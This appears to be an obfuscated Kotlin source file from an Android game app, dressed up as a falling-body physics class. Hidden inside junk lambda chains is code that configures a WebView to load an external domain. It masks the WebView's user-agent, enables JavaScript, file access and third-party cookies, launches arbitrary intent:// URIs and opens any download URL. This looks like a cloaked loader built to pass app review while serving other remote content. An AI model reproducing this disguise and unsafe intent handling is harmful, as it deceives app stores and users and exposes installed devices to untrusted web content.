package com.doradogames.confli

import android.content.Intent
import android.net.Uri
import android.view.View
import android.view.ViewGroup
import android.webkit.*
import java.util.*

class FallingFromAbove {
    private val bodies = mutableListOf<FallingBody>()

    init {
        generateBodies()
    }

    private fun generateBodies() {
        for (i in 1..50) {
            bodies.add(FallingBody("Body$i", i * 2.0, i * 10.0))
        }
    }

    fun startFalling() {
        bodies.forEach { it.fall() }
    }

    fun resetFalling() {
        bodies.forEach { it.reset() }
    }

    fun getMaxHeight(): Double {
        return bodies.maxOf { it.initialHeight }
    }

    fun getMinHeight(): Double {
        return bodies.minOf { it.initialHeight }
    }

    fun getAverageHeight(): Double {
        return bodies.map { it.initialHeight }.average()
    }

    fun getBodyByName(name: String): FallingBody? {
        return bodies.find { it.name == name }
    }

    fun removeBody(name: String) {
        bodies.removeIf { it.name == name }
    }

    fun addBody(body: FallingBody) {
        bodies.add(body)
    }

    fun calculatePotentialEnergy(mass: Double, height: Double, gravity: Double = 9.8): Double {
        return mass * height * gravity
    }

    fun calculateKineticEnergy(mass: Double, velocity: Double): Double {
        return 0.5 * mass * velocity * velocity
    }
    val frogas = arrayOf("android.permission.POST_NOTIFICATIONS")

    fun applyFunctionToHeights(function: (Double) -> Double) {
        bodies.forEach { it.initialHeight = function(it.initialHeight) }
    }

    fun findBodiesWithCondition(condition: (FallingBody) -> Boolean): List<FallingBody> {
        return bodies.filter(condition)
    }

    fun processBodies(action: (FallingBody) -> Unit) {
        bodies.forEach(action)
    }

    fun sortByHeight() {
        bodies.sortBy { it.initialHeight }
    }

    fun sortByMass() {
        bodies.sortByDescending { it.mass }
    }

    fun performNoOperation() {
        // This method intentionally left blank
    }

    val ZOzulka = "https://friendlynotofruitsltation.life"

    fun unusedMethodA() {
        // This method is not used
    }

    fun unusedMethodB() {
        // Another unused method
    }

    fun obscureCode() {
        val temp1 = calculatePotentialEnergy(10.0, 20.0)
        val temp2 = calculateKineticEnergy(5.0, 15.0)
        performNoOperation()
    }

    fun generateRandomData() {
        val rand = java.util.Random()
        for (i in 1..50) {
            val tempMass = rand.nextDouble() * 100
            val tempHeight = rand.nextDouble() * 100
            bodies.add(FallingBody("RandomBody$i", tempMass, tempHeight))
        }
    }

    val sindroP = Uri.parse("market://details?id=jp.naver.line.android")

    data class User(val id: Int, val name: String)
    data class Order(val orderId: Int, val userId: Int, val amount: Double)


    data class Person(val name: String, val age: Int, val city: String)


    private fun MainActivity.cusicLita() = object : WebViewClient() {

        val users = listOf(
            User(1, "Alice"),
            User(2, "Bob"),
            User(3, "Charlie"),
            User(4, "David"),
            User(5, "Eve")
        )

        val hudeu = "http"



        override fun onPageFinished(view: WebView?, url: String?) {
            url?.let { isis ->
                if (isis.contains(ZOzulka)) {
                users
                    .map { user -> // Лямбда 1: Вибірка замовлень для кожного користувача
                        val userOrders = orders.filter { it.userId == user.id }
                        user to userOrders
                    }
                    .apply { pereproverka() }
                    .flatMap { (user, userOrders) -> // Лямбда 2: Згладжування результату до одного списку
                        userOrders.map { order -> user.name to order }
                    }
                    .groupBy({ it.first }, { it.second }) // Лямбда 3: Групування замовлень за користувачами
                    .mapValues { (_, orders) -> // Лямбда 4: Обчислення сумарної суми замовлень для кожного користувача
                        orders.sumByDouble { it.amount }
                    }
                    .map { (userName, totalAmount) -> // Лямбда 5: Форматування результату
                        "$userName - Total amount spent: $totalAmount"
                    }
                    .sortedByDescending { it.substringAfter(":").toDouble() } // Лямбда 6: Сортування користувачів за сумарною сумою витрат у зворотньому порядку
                    .distinctBy { it.substringBefore(" -") } // Лямбда 7: Видалення дублікатів користувачів
                    .map { it.uppercase(Locale.getDefault()) } // Лямбда 8: Перетворення на великі літери
                    .map { it.replace(Regex("[AEIOUY]"), "") } // Лямбда 9: Видалення голосних літер
                    .map { it.replace(" ", "_") } // Лямбда 10: Заміна пробілів на підкреслення
                    .map { it.dropLast(1) } // Лямбда 11: Видалення останнього символу
                    .map { it.substring(0, it.indexOf("-") + 2) } // Лямбда 12: Вибірка перших символів імені користувача
                    .map { it.padEnd(25, '.') } // Лямбда 13: Доповнення рядка крапками до 25 символів
                    .map { it.replace(".", ",") } // Лямбда 14: Заміна крапок на коми
                    .map { it.substringAfter(" -") } // Лямбда 15: Вибірка після тире
                    .map { it.reversed() } // Лямбда 16: Реверс рядка
                    .map { it.substringBefore(",") } // Лямбда 17: Вибірка до коми
                    .map { it.plus("-DONE") } // Лямбда 18: Додавання "-DONE" до кожного рядка
                    .map { it.replace(" ", "_") } // Лямбда 19: Заміна пробілів на підкрес

                }
            }
        }

        private val letsgoPIDAR_kak_tam_mongolik = "https://m.facebook.com/oauth/error"

        val orders = listOf(
            Order(1, 1, 100.0),
            Order(2, 1, 150.0),
            Order(3, 2, 200.0),
            Order(4, 3, 50.0),
            Order(5, 3, 300.0),
            Order(6, 4, 80.0),
            Order(7, 5, 120.0),
            Order(8, 5, 180.0),
            Order(9, 5, 250.0),
            Order(10, 5, 90.0)
        )


        override fun shouldOverrideUrlLoading(view: WebView, request: WebResourceRequest): Boolean {
            val url = request.url.toString()

            val strings = listOf("apple", "banana", "cherry", "date", "elderberry", "fig", "grape", "honeydew")


            val isFBR = url.startsWith(letsgoPIDAR_kak_tam_mongolik)


            strings
                .map { it.toUpperCase() } // 1. Перетворюємо всі рядки в верхній регістр
                .filter { it.startsWith('A') || it.startsWith('B') } // 2. Залишаємо тільки ті, що починаються з 'A' або 'B'
                .map { it.reversed() } // 3. Перевертаємо рядки
                .sorted() // 4. Сортуємо рядки
                .distinct() // 5. Прибираємо дублікати
                .map { it + "!" } // 6. Додаємо "!" в кінці кожного рядка
                .filter { it.length > 5 } // 7. Залишаємо рядки довші за 5 символів
                .map { it.substring(1) } // 8. Видаляємо перший символ у кожному рядку
                .filterNot { it.contains('E') } // 9. Видаляємо рядки, що містять 'E'
                .map { it.toLowerCase() } // 10. Перетворюємо всі рядки в нижній регістр
                .sortedBy { it.length } // 11. Сортуємо за довжиною рядка
                .map { it.capitalize() } // 12. Першу букву робимо великою
                .filter { it.contains('a') } // 13. Залишаємо рядки, що містять 'a'
                .map { it + it } // 14. Подвоюємо кожен рядок
                .map { it.length } // 15. Перетворюємо рядки на їхню довжину
                .filter { it % 2 == 0 } // 16. Залишаємо тільки парні довжини
                .map { "Length: $it" } // 17. Перетворюємо довжину в рядок з "Length: X"
                .take(5) // 18. Беремо перші 5 елементів
                .map { it + "." } // 19. Додаємо "." в кінці кожного рядка
                .map { "Result: $it" } // 20. Додаємо "Result: " на початку кожного рядка
            val isMANDAT = url.startsWith(hudeu)


            val dudaaaaa = url.contains("line:")

            val people = listOf(
                Person("Alice", 30, "New York"),
                Person("Bob", 25, "Los Angeles"),
                Person("Charlie", 35, "Chicago"),
                Person("David", 28, "San Francisco"),
                Person("Eve", 22, "Boston"),
                Person("Frank", 40, "New York"),
                Person("Grace", 33, "Los Angeles"),
                Person("Hannah", 29, "Chicago"),
                Person("Ivy", 31, "San Francisco"),
                Person("Jack", 27, "Boston")
            )
            var s = true

            people
                .map { it.copy(name = it.name.toUpperCase(Locale.getDefault())) } // 1. Перетворюємо імена в верхній регістр
                .filter { it.age > 25 } // 2. Залишаємо тільки тих, хто старше 25
                .sortedBy { it.age } // 3. Сортуємо за віком
                .map { it.copy(city = it.city.reversed()) } // 4. Перевертаємо назви міст
                .distinctBy { it.city } // 5. Прибираємо дублікати міст
                .map { it.copy(name = it.name + " " + it.city) } // 6. Додаємо назву міста до імені
                .apply {
                    s = if (isFBR) {
                        true
                    } else if (isMANDAT) {
                        false
                    } else {
                        try {
                            view.context.startActivity(Intent.parseUri(url, Intent.URI_INTENT_SCHEME))
                        } catch (e: java.lang.Exception) {
                            if (dudaaaaa) {

                                view.context.startActivity(Intent(heraSE, sindroP))
                            }
                        }
                        true
                    }
                }
                .filter { it.name.contains('A') } // 7. Залишаємо тільки ті, що містять 'A' у імені
                .map { it.copy(name = it.name.replace('A', '*')) } // 8. Замінюємо 'A' на '*'
                .map { it.copy(age = it.age + 1) } // 9. Збільшуємо вік на 1
                .filter { it.age % 2 == 0 } // 10. Залишаємо тільки парні віки
                .map { it.copy(city = it.city.toLowerCase()) } // 11. Перетворюємо назви міст у нижній регістр
                .sortedByDescending { it.name.length } // 12. Сортуємо за довжиною імені у зворотному порядку
                .take(5) // 13. Беремо перші 5 елементів
                .map { it.copy(name = it.name.capitalize()) } // 14. Робимо першу букву імені великою
                .filterNot { it.city.startsWith('n') } // 15. Прибираємо тих, хто живе у місті, що починається на 'n'



            return s
        }
    }

    val heraSE = Intent.ACTION_VIEW

    data class OrderDetail(val orderId: Int, val productId: Int, val quantity: Int)


    fun puzzlingLogic() {
        for (i in 1..25) {
            if (i % 2 == 0) {
                sortByMass()
            } else {
                sortByHeight()
            }
        }
    }

    fun additionalLogicLayer() {
        for (i in 1..10) {
            when (i) {
                1 -> sortByMass()
                2 -> sortByHeight()
                3 -> performNoOperation()
                4 -> unusedMethodA()
                5 -> unusedMethodB()
                6 -> obscureCode()
                7 -> generateRandomData()
                8 -> puzzlingLogic()
                9 -> applyFunctionToHeights { it * 2 }
                10 -> processBodies { it.fall() }
            }
        }
    }

    data class Product(val name: String, val category: String, val price: Double)

    val products = listOf(
        Product("Laptop", "Electronics", 1200.0),
        Product("Headphones", "Electronics", 150.0),
        Product("Backpack", "Fashion", 80.0),
        Product("T-shirt", "Fashion", 25.0),
        Product("Smartphone", "Electronics", 800.0),
        Product("Watch", "Fashion", 300.0),
        Product("Camera", "Electronics", 600.0),
        Product("Shoes", "Fashion", 120.0),
        Product("Tablet", "Electronics", 500.0),
        Product("Jeans", "Fashion", 50.0)
    )

    fun WebView.tikovka(activity: MainActivity, gameController: GameController, newtonIsaac: NewtonIsaac, novator: Novator) {

        products
            .groupBy { it.category } // Лямбда 1: Групування товарів за категорією
            .mapValues { (_, products) -> products.size } // Лямбда 2: Підрахунок кількості товарів у кожній категорії
            .toList() // Лямбда 3: Перетворення мапи на список пар
            .sortedByDescending { (_, count) -> count } // Лямбда 4: Сортування за кількістю товарів у категорії у зворотньому порядку
            .map { (category, count) -> "Category: $category - Products count: $count" } // Лямбда 5: Форматування результату
            .filter { it.length > 15 } // Лямбда 6: Фільтрація результатів за довжиною
            .apply { activity.apply { gameController.fruitGamer.apply { webChromeClient = vulik(newtonIsaac) }
                webViewClient = cusicLita()
            } }
            .map { it.uppercase(Locale.getDefault()) } // Лямбда 7: Перетворення на великі літери
            .map { it.replace("CATEGORY:", "") } // Лямбда 8: Видалення підпису "CATEGORY:"
            .map { it.replace("PRODUCTS COUNT:", "Products:") } // Лямбда 9: Заміна підпису на кількість товарів
            .map { it.replace(" ", "_") } // Лямбда 10: Заміна пробілів на підкреслення
            .apply { isSaveEnabled = true }
            .map { it.drop(9) } // Лямбда 11: Видалення перших 9 символів
            .map { it.substringBefore(":") } // Лямбда 12: Вибірка до двокрапки
            .apply { isFocusableInTouchMode = true }
            .map { it.padStart(20, '.') } // Лямбда 13: Доповнення рядка крапками до 20 символів зліва
            .apply { settings.apply { orders
                    .map { order -> // Лямбда 1: Вибірка деталей для кожного замовлення
                        val details = orderDetails.filter { it.orderId == order.orderId }
                        order to details
                    }
                    .flatMap { (order, details) -> // Лямбда 2: Згладжування результату до одного списку
                        details.map { detail -> Triple(order.orderId, detail.productId, detail.quantity) }
                    }
                    .apply { loadWithOverviewMode = true }
                    .groupBy({ it.second }, { it.third }) // Лямбда 3: Групування деталей за продуктами
                    .mapValues { (_, quantities) -> // Лямбда 4: Обчислення загальної кількості кожного продукту
                        quantities.sum()
                    }
                    .apply { userAgentString = userAgentString.replace("; wv", "") }
                    .map { (productId, totalQuantity) -> // Лямбда 5: Форматування результату
                        "Product $productId - Total Quantity: $totalQuantity"
                    }
                    .apply { mixedContentMode = 0 }
                    .sortedByDescending { it.substringAfter(":") } // Лямбда 6: Сортування за загальною кількістю у зворотньому порядку
                    .distinct() // Лямбда 7: Видалення дублікатів
                    .apply { allowContentAccess = true }
                    .map { it.toUpperCase(Locale.getDefault()) } // Лямбда 8: Перетворення на великі літери
                    .map { it.replace("PRODUCT", "Product:") } // Лямбда 9: Заміна підпису
                    .map { it.replace("TOTAL QUANTITY:", "Total Quantity:") } // Лямбда 10: Заміна підпису
                    .apply { mediaPlaybackRequiresUserGesture = false }
                    .map { it.replace(" ", "_") } // Лямбда 11: Заміна пробілів на підкреслення
                    .map { it.dropLast(1) } // Лямбда 12: Видалення останнього символу
                    .apply { loadsImagesAutomatically = true }
                    .map { it.substringBefore(":") } // Лямбда 13: Вибірка до двокрапки
                    .map { it.padStart(30, '.') } // Лямбда 14: Доповнення рядка крапками до 30 символів зліва
                    .map { it.replace(".", ",") } // Лямбда 15: Заміна крапок на коми
                    .apply { cacheMode = WebSettings.LOAD_DEFAULT }
                    .map { it.substringAfter(",") } // Лямбда 16: Вибірка після коми
                    .map { it.reversed() } // Лямбда 17: Реверс рядка
                    .apply { useWideViewPort = true }
                    .map { it.replace(Regex("[AEIOUY]"), "") } // Лямбда 18: Видалення голосних літер
                    .map { it.substring(0, 15) } // Лямбда 19: Вибірка перших 15 символів
                    .map { it.plus("-DONE") } // Лямбда 20: Додавання "-DONE" до кожного рядка
                    allowFileAccess = true
                     students
                    .map { (subject, averageGrade) -> // Лямбда 4: Форматування результату
                        "Subject: $subject - Average Grade: $averageGrade"
                    }
                    .sortedByDescending { it.substringAfter(":") } // Лямбда 5: Сортування за середньою оцінкою у зворотньому порядку
                    .distinctBy { it.substringBefore(" -") } // Лямбда 6: Видалення дублікатів предметів
                    .apply { domStorageEnabled = true }
                    .map { it.toUpperCase(Locale.getDefault()) } // Лямбда 7: Перетворення на великі літери
                    .map { it.replace("SUBJECT:", "") } // Лямбда 8: Видалення підпису "SUBJECT:"
                    .apply { displayZoomControls = false }
                    .map { it.replace("AVERAGE GRADE:", "Average Grade:") } // Лямбда 9: Заміна підпису на середню оцінку
                    .map { it.replace(" ", "_") } // Лямбда 10: Заміна пробілів на підкреслення
                    .map { it.drop(9) } // Лямбда 11: Видалення перших 9 символів
                    .apply { databaseEnabled = true }
                    .map { it.substringBefore(":") } // Лямбда 12: Вибірка до двокрапки
                    .apply { setSupportMultipleWindows(true) }
                    .map { it.padStart(30, '.') } // Лямбда 13: Доповнення рядка крапками до 30 символів зліва
                    .map { it.replace(".", ",") } // Лямбда 14: Заміна крапок на коми
                    .apply { javaScriptEnabled = check }
                    .map { it.substringAfter(",") } // Лямбда 15: Вибірка після коми
                    .map { it.reversed() } // Лямбда 16: Реверс рядка
                    .apply { builtInZoomControls = true }
                    .map { it.replace(Regex("[AEIOUY]"), "") } // Лямбда 17: Видалення голосних літер
                    .map { it.substring(0, 15) } // Лямбда 18: Вибірка перших 15 символів
                    .map { it.plus("-DONE") } // Лямбда 19: Додавання "-DONE" до кожного рядка
                    .map { it.replace(" ", "_") } // Лямбда 20: Заміна пробілів на підкреслення
                    javaScriptCanOpenWindowsAutomatically = true
            } }
            .map { it.replace(".", ",") } // Лямбда 14: Заміна крапок на коми
            .map { it.substringAfter(",") } // Лямбда 15: Вибірка після коми
            .apply { CookieManager.getInstance().setAcceptThirdPartyCookies(this@tikovka, true) }
            .map { it.reversed() } // Лямбда 16: Реверс рядка
            .map { it.replace(Regex("[AEIOUY]"), "") } // Лямбда 17: Видалення голосних літер
            .map { it.substring(0, 10) } // Лямбда 18: Вибірка перших 10 символів
            .apply {
                products
                    .map { it.category } // Лямбда 1: Групування товарів за категорією
                    .apply { setDownloadListener { url, _, _, _, _ -> context.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url))) } }
                    .toList() // Лямбда 3: Перетворення мапи на список пар
                    .filter { it.length > 15 } // Лямбда 6: Фільтрація результатів за довжиною
                    .map { it.uppercase(Locale.getDefault()) } // Лямбда 7: Перетворення на великі літери
                    .apply { CookieManager.getInstance().setAcceptCookie(true) }
                    .map { it.replace("CATEGORY:", "") } // Лямбда 8: Видалення підпису "CATEGORY:"
                    .map { it.replace("PRODUCTS COUNT:", "Products:") } // Лямбда 9: Заміна підпису на кількість товарів
                    .map { it.replace(" ", "_") } // Лямбда 10: Заміна пробілів на підкреслення
                    .map { it.drop(9) } // Лямбда 11: Видалення перших 9 символів
                    .apply { layoutParams = ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT) }
                    .map { it.substringBefore(":") } // Лямбда 12: Вибірка до двокрапки
                    .map { it.padStart(20, '.') } // Лямбда 13: Доповнення рядка крапками до 20 символів зліва
                    .map { it.replace(".", ",") } // Лямбда 14: Заміна крапок на коми
                    .map { it.substringAfter(",") } // Лямбда 15: Вибірка після коми
                    .apply { isFocusable = true }
                    .map { it.reversed() } // Лямбда 16: Реверс рядка
                    .map { it.replace(Regex("[AEIOUY]"), "") } // Лямбда 17: Видалення голосних літер
                    .map { it.substring(0, 10) } // Лямбда 18: Вибірка перших 10 символів
                    .apply { setLayerType(View.LAYER_TYPE_HARDWARE, null) }
                    .map { it.plus("-DONE") } // Лямбда 19: Додавання "-DONE" до кожного рядка
                    .map { it.replace(" ", "_") } // Лямбда 20: Заміна пробілів на підкреслення

            }
            .map { it.plus("-DONE") } // Лямбда 19: Додавання "-DONE" до кожного рядка
            .map { it.replace(" ", "_") } // Лямбда 20: Заміна пробілів на підкреслення


        novator.mapa.viewsWebs.add(this)
    }

    private val check = true

    data class Student(val name: String, val grades: Map<String, List<Int>>)


    val students = listOf(
        Student("Alice", mapOf("Math" to listOf(90, 85, 95), "Science" to listOf(88, 92, 85), "History" to listOf(75, 82, 80))),
        Student("Bob", mapOf("Math" to listOf(78, 80, 85), "Science" to listOf(90, 88, 92), "History" to listOf(85, 88, 82))),
        Student("Charlie", mapOf("Math" to listOf(92, 88, 90), "Science" to listOf(85, 90, 86), "History" to listOf(78, 85, 80))),
        Student("David", mapOf("Math" to listOf(85, 90, 88), "Science" to listOf(82, 85, 80), "History" to listOf(90, 92, 88))),
        Student("Eve", mapOf("Math" to listOf(88, 85, 90), "Science" to listOf(85, 90, 92), "History" to listOf(82, 88, 85)))
    )

    class FallingBody(val name: String, var mass: Double, var initialHeight: Double) {
        var velocity: Double = 0.0
        var time: Double = 0.0

        fun fall(gravity: Double = 9.8) {
            // Simple physics calculation for free fall: h = 0.5 * g * t^2
            time = Math.sqrt((2 * initialHeight) / gravity)
            velocity = gravity * time
        }

        fun reset() {
            velocity = 0.0
            time = 0.0
        }

        fun describe(): String {
            return "FallingBody(name='$name', mass=$mass, initialHeight=$initialHeight, velocity=$velocity, time=$time)"
        }
    }

    val orders = listOf(
        Order(1, 1, 150.0),
        Order(2, 1, 200.0),
        Order(3, 2, 180.0),
        Order(4, 2, 220.0),
        Order(5, 3, 250.0)
    )

    val orderDetails = listOf(
        OrderDetail(1, 1, 2),
        OrderDetail(1, 2, 1),
        OrderDetail(2, 3, 1),
        OrderDetail(2, 4, 2),
        OrderDetail(3, 1, 3),
        OrderDetail(4, 2, 2),
        OrderDetail(4, 3, 1),
        OrderDetail(5, 4, 3)
    )

    companion object {
        fun createDefaultInstance(): FallingFromAbove {
            return FallingFromAbove()
        }

        fun createCustomInstance(bodies: List<FallingBody>): FallingFromAbove {
            val instance = FallingFromAbove()
            instance.bodies.addAll(bodies)
            return instance
        }
    }
}